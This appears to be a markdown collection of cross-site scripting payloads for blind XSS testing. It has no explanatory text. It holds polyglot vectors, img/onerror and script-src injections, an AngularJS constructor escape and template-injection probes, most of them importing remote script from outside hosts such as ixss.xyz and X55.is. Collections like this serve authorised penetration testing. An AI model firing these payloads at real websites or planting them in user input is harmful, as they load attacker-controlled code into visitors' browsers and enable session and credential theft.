## General Payload Collection:
```bash
-->';"><img src=x onerror=import('//ixss.xyz')>//
```
```bash
-->';"><script src=//ixss.xyz></script><x="
```
```bash
"><img/src/onerror=import('//ixss.xyz')>
```
```bash
$.getScript("//ixss.xyz")
```
```bash
{{_openBlock.constructor('import("//ixss.xyz")')()}}{{constructor.constructor('import("//ixss.xyz")')()}}
```
```bash
javascript:import('//ixss.xyz')
```
```bash
javascript:eval('var a=document.createElement(\'script\');a.src=\'//ixss.xyz\';document.body.appendChild(a)')
```
```bash
';"/><h1>test{{7*7}}
```
```bash
HTMLi<h1>HTMLi&gt;h1&lt;Test{{7*7}}[[7*7]]
```

## KnoXSS
>Blind XSS Custom Vector - Short Polyglot (HTML & JS Main Cases)
```
'/*\'/*"/*\"/*</Script><Input/AutoFocus/OnFocus=/**/(import(/https:\\X55.is?1=19473/.source))//>
```
>Blind XSS Custom Vector - Full Polyglot (20+ XSS Cases): Best, for non-restricted inputs.

```
JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(import(/https:\\X55.is?1=19473/.source))}//\76-->
```

## Burpsuite Payloads:
```
bxss
```
```
';\"><script src=//ixss.xyz></script><x=\"
```
```
';\"><img src onerror=import('//ixss.xyz')>
```
```
htmli
```
```
\"/><h1>test{{7*7}}[[7*7]]
```
